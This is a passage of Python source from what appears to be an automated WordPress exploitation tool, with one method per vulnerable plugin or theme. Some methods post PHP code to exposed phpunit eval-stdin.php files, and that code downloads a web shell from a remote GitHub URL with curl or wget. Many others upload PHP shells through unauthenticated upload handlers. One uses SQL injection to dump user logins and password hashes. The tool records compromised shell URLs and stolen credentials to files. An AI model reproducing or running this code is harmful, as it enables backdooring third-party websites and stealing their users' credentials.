			Exp = (url+'/wp-content/plugins/contabileads/integracoes/mautic/api-library/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}Contabileads{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}Contabileads{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}Contabileads{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Contabileads{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Contabileads{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Cloudflare(self, url):
		try:
			Check = (url+'/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/build.xml')
			Exp = (url+'/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php')
			Cek = requests.get(Check, headers=headers, timeout=9)
			if 'taskname="phpunit"' in Cek.content:
				shell1 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath.php')
				shell2 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath2.php')
				shell3 = str(Exp).replace('eval-stdin.php', 'Uploader_By_Cloud7_Agath3.php')
				Payload = '<?php system("curl -O https://raw.githubusercontent.com/NeloF4/RCE/master/One"); system("mv One Uploader_By_Cloud7_Agath.php"); ?>'
				Payload2 = '<?php system("wget https://raw.githubusercontent.com/NeloF4/RCE/master/One -O Uploader_By_Cloud7_Agath2.php"); ?>'
				Payload3 = '<?php fwrite(fopen("Uploader_By_Cloud7_Agath3.php","w+"),file_get_contents("https://raw.githubusercontent.com/NeloF4/RCE/master/One")); ?>'
				r = requests.post(Exp, data=Payload, headers=headers, timeout=10, verify=False)
				rr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				rrr = requests.post(Exp, data=Payload2, headers=headers, timeout=10, verify=False)
				c1 = requests.get(shell1, headers=headers, timeout=10)
				c2 = requests.get(shell2, headers=headers, timeout=10)
				c3 = requests.get(shell3, headers=headers, timeout=10)
				if 'Uploader_By_Cloud7_Agath_' in c1.content:
					print('[WordPress] {}{}{} ||{}Cloudflare{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell1+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c2.content:
					print('[WordPress] {}{}{} ||{}Cloudflare{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell2+'\n')
				if 'Uploader_By_Cloud7_Agath_' in c3.content:
					print('[WordPress] {}{}{} ||{}Cloudflare{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
					open('Result/WordPress_Shell.txt', 'a').write(shell3+'\n')
				else:
					print('[WordPress] {}{}{} ||{}Cloudflare{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}Cloudflare{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def HD_Webplayer(self, url):
		try:
			check = (url+'/wp-content/plugins/hd-webplayer/playlist.php')
			c = requests.get(check, headers=headers, timeout=10)
			if '<?xml version="' in c.content:
				Exp = (url+'/wp-content/plugins/hd-webplayer/playlist.php?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11+from+wp_users--')
				GoT = requests.get(Exp, headers=headers, timeout=10)
				User_Pass = re.findall('<title>(.*)</title>', GoT.content)
				username = User_Pass[1].split(':')[0]
				password = User_Pass[1].split(':')[1]
				open('Result/SQLi.txt', 'a').write('Domain: '+url+'\nUsername: '+username+'\nPassword: '+password+'\n\n')
				print('[WordPress] {}{}{} ||{}HD-Webplayer{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
			else:
				print('[WordPress] {}{}{} ||{}HD-Webplayer{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass



	def Cameleon(self, url):
		try:
			file = {'qqfile':open(php, 'rb')}
			p = (url+'/wp-content/themes/cameleon/includes/fileuploader/upload_handler.php')
			check =(url+url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			r = requests.post(p, headers=headers, files=file)
			rr =requests.get(check, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in rr.content:
				print('[WordPress] {}{}{} ||{}Cameleon{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(check+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Cameleon{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Agritourismo(self, url):
		try:
			file = {'orange_themes':open (php, 'rb')}
			p = (url+'/wp-content/themes/agritourismo-theme/functions/upload-handler.php')
			check = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			r = requests.post(p, headers=headers, files=file)
			rr = requests.get(check, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in rr.content:
				print('[WordPress] {}{}{} ||{}Agritourismo{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(check+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Agritourismo{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass
	def Bordeaux(self, url):

		try:
			p = (url+'/wp-content/themes/bordeaux-theme/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			data = {'orange_themes':open (php, 'rb')}
			borpost = requests.post(p, headers=headers, files=data)
			borget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in borget.content:
				print('[WordPress] {}{}{} ||{}Bordeaux{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Bordeaux{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass
	def Bulteno(self, url):

		try:

			data = {'orange_themes':open (php, 'rb')}
			p = (url+'/wp-content/themes/bulteno-theme/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			bulpost = requests.post(p, headers=headers, files=data)
			bulget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in bulget.content:
				print('[WordPress] {}{}{} ||{}Bulteno{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Bulteno{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass
	def Oxygen(self, url):

		try:

			data = {'orange_themes':open (php, 'rb')}
			p = (url+'/wp-content/themes/oxygen-theme/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			oxpost = requests.post(p, headers=headers, files=data)
			oxget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in oxget.content:
				print('[WordPress] {}{}{} ||{}Oxygen{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Oxygen{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Radial(self, url):

		try:

			data = {'orange_themes':open (php, 'rb')}
			p = (url+'/wp-content/themes/radial-theme/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			rapost = requests.post(p, headers=headers,files=data)
			raget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in raget.content:
				print('[WordPress] {}{}{} ||{}Radial{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Radial{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def Rayoflight(self, url):

		try:

			data = {'orange_themes':open (php, 'rb')}
			p = (url+'/wp-content/themes/rayoflight-theme/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			raypost = requests.post(p, headers=headers,files=data)
			rayget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in rayget.content:
				print('[WordPress] {}{}{} ||{}Rayoflight{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Rayoflight{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Reganto(self, url):

		try:

			data = {'orange_themes':open (php, 'rb')}
			p = (url+'/wp-content/themes/reganto-theme/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			regpost = requests.post(p, headers=headers,files=data)
			regget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in regget.content:
				print('[WordPress] {}{}{} ||{}Reganto{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Reganto{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Rockstar(self, url):

		try:

			data = {'orange_themes':open (php, 'rb')}
			p = (url+'/wp-content/themes/rockstar-theme/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			rocpost = requests.post(p, headers=headers,files=data)
			rocget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in rocget.content:
				print('[WordPress] {}{}{} ||{}Rockstar{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Rockstar{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Qualifire(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php')
			c = (url+'/wp-content/themes/qualifire/scripts/admin/uploadify/Uploader_By_Cloud7_Agath.php')
			quapost = requests.post(p, headers=headers, files=data)
			quaget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in quaget.content:
				print('[WordPress] {}{}{} ||{}Qualifire{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Qualifire{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass

	def Ghost(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/Ghost/includes/uploadify/upload_Settings2_image.php')
			c = (url+'/wp-content/uploads/settingsimages/Uploader_By_Cloud7_Agath.php')
			ghopost = requests.post(p, headers=headers, files=data)
			ghoget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in ghoget.content:
				print('[WordPress] {}{}{} ||{}Ghost{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Ghost{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Anthology(self, url):

		try:

			data = {'pexetofile':open (phtml, 'rb')}
			p = (url+'/wp-content/themes/Anthology/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.phtml')
			antpost = requests.post(p, headers=headers, files=data)
			antget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in antget.content:
				print('[WordPress] {}{}{} ||{}Anthology{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Anthology{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Kiddo(self, url):

		try:

			data = {'Filedata':open (phtml, 'rb')}
			p = (url+'/wp-content/themes/kiddo/app/assets/js/uploadify/uploadify.php')
			c = (url+'/Uploader_By_Cloud7_Agath.phtml')
			kidpost = requests.post(p, headers=headers, files=data)
			kidget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in kidget.content:
				print('[WordPress] {}{}{} ||{}Kiddo{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Kiddo{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Thisway(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php')
			c = (url+'/wp-content/uploads'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			thispost = requests.post(p, headers=headers, files=data)
			thisget = requests.get(c, headers=headers)
			if 'Uploader_By_Cloud7_Agath_' in thisget.content:
				print('[WordPress] {}{}{} ||{}ThisWay{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}ThisWay{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Udesign(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php')
			c = (url+'/Uploader_By_Cloud7_Agath.php')
			udpost = requests.post(p, headers=headers, files=data)
			udget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in udget.content:
				print('[WordPress] {}{}{} ||{}U-Design{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}U-Design{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Themify1(self, url):
		# elemin

		try:
			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/elemin/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/elemin/uploads/Uploader_By_Cloud7_Agath.php')
			elpost = requests.post(p, headers=headers, files=data)
			elget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in elget.content:
				print('[WordPress] {}{}{} ||{}Elemin{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Elemin{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		
		except:
			pass

	def Themify2(self, url):
		# tisa

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/tisa/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/tisa/uploads/Uploader_By_Cloud7_Agath.php')
			tispost = requests.post(p, headers=headers, files=data)
			tisget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in tisget.content:
				print('[WordPress] {}{}{} ||{}Tisa{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Tisa{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Themify3(self, url):
		# funki

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/funki/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/funki/uploads/Uploader_By_Cloud7_Agath.php')
			funpost = requests.post(p, headers=headers, files=data)
			funget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in funget.content:
				print('[WordPress] {}{}{} ||{}Funki{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Funki{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Themify4(self, url):
		# pinboard

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/pinboard/uploads/Uploader_By_Cloud7_Agath.php')
			pinpost = requests.post(p, headers=headers, files=data)
			pinget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in pinget.content:
				print('[WordPress] {}{}{} ||{}Pinboard{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Pinboard{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def Themify5(self, url):
		# Folo

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/folo/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/folo/uploads/Uploader_By_Cloud7_Agath.php')
			fopost = requests.post(p, headers=headers, files=data)
			foget = requests.get(c, headers=headers)
			if 'Uploader_By_Cloud7_Agath_' in foget.content:
				print('[WordPress] {}{}{} ||{}Folo{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Folo{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def themify6(self, url):
		# grido

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/grido/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/grido/uploads/Uploader_By_Cloud7_Agath.php')
			gripost = requests.post(p, headers=headers, files=data)
			griget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in griget.content:
				print('[WordPress] {}{}{} ||{}Grido{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Grido{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def themify7(self, url):
		# suco

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/suco/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/suco/uploads/Uploader_By_Cloud7_Agath.php')
			supost = requests.post(p, headers=headers, files=data)
			suget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in suget.content:
				print('[WordPress] {}{}{} ||{}Suco{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Suco{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def themify8(self, url):
		# iThemes2

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/ithemes2/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/ithemes2/uploads/Uploader_By_Cloud7_Agath.php')
			itpost = requests.post(p, headers=headers, files=data)
			itget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in itget.content:
				print('[WordPress] {}{}{} ||{}iThemes2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}iThemes2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def themify9(self, url):
		# basic

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/basic/themify/themify-ajax.php?upload=1')
			c = (url+'/wp-content/themes/basic/uploads/Uploader_By_Cloud7_Agath.php')
			bapost = requests.post(p, headers=headers, files=data)
			baget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in baget.content:
				print('[WordPress] {}{}{} ||{}Basic{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Basic{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def rightnow(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/RightNow/includes/uploadify/upload_background_image.php')
			c = (url+'/wp-content/uploads/galleryimages/Uploader_By_Cloud7_Agath.php')
			rigpost = requests.post(p, headers=headers, files=data)
			rigget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in rigget.content:
				print('[WordPress] {}{}{} ||{}RightNow{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}RightNow{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def coldfusion(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/Coldfusion/includes/uploadify/upload_settings2_image.php')
			c = (url+'/wp-content/uploads/settings2images/Uploader_By_Cloud7_Agath.php')
			colpost = requests.post(p, headers=headers, files=data)
			colget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in colget.content:
				print('[WordPress] {}{}{} ||{}Coldfusion{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Coldfusion{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def magicfields(self, url):

		try:

			data = {'qqfile':open (php, 'rb')}
			p = (url+'/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php')
			c = (url+'/wp-content/files_mf/Uploader_By_Cloud7_Agath.php')
			magpost = requests.post(p, headers=headers, files=data)
			magget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in magget.content:
				print('[WordPress] {}{}{} ||{}Magicfields Plugins{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Magicfields Plugins{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass



	def konzept(self, url):

		try:

			dat = {'name':'Uploader_By_Cloud7_Agath.php'}
			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/themes/konzept/includes/uploadify/upload.php')
			c = (url+'/wp-content/themes/konzept/includes/uploadify/Uploader_By_Cloud7_Agath.php')
			konpost = requests.post(p, headers=headers, data=dat, files=data)
			konget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in konget.content:
				print('[WordPress] {}{}{} ||{}Konzept{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Konzept{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def dancestudio(self, url):

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/themes/dance-studio/core/libs/imperavi/tests/file_upload.php')
			c = (url+'/wp-content/uploads/Uploader_By_Cloud7_Agath.php')
			danpost = requests.post(p, headers=headers, files=data)
			danget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in danget.content:
				print('[WordPress] {}{}{} ||{}Dance Studio{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Dance Studio{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def cubed(self, url):

		try:

			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/wp-content/themes/cubed_v1.2/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			cupost = requests.post(p, headers=headers, files=data)
			cuget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in cuget.content:
				print('[WordPress] {}{}{} ||{}Cubed{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Cubed{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass
	
	def amplus(self, url):

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/themes/amplus/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			ampost = requests.post(p, headers=headers, files=data)
			amget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in amget.content:
				print('[WordPress] {}{}{} ||{}Amplus{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Amplus{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def highlight(self, url):

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/themes/highlight/lib/utils/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			higpost = requests.post(p, headers=headers, files=data)
			higget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in higget.content:
				print('[WordPress] {}{}{} ||{}Highlight{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Highlight{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def dandelion(self, url):

		try:

			data = {'qqfile':open (php, 'rb')}
			p = (url+'/wp-content/themes/dandelion/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			danpost = requests.post(p, headers=headers, files=data)
			danget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in danget.content:
				print('[WordPress] {}{}{} ||{}Dandelion{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
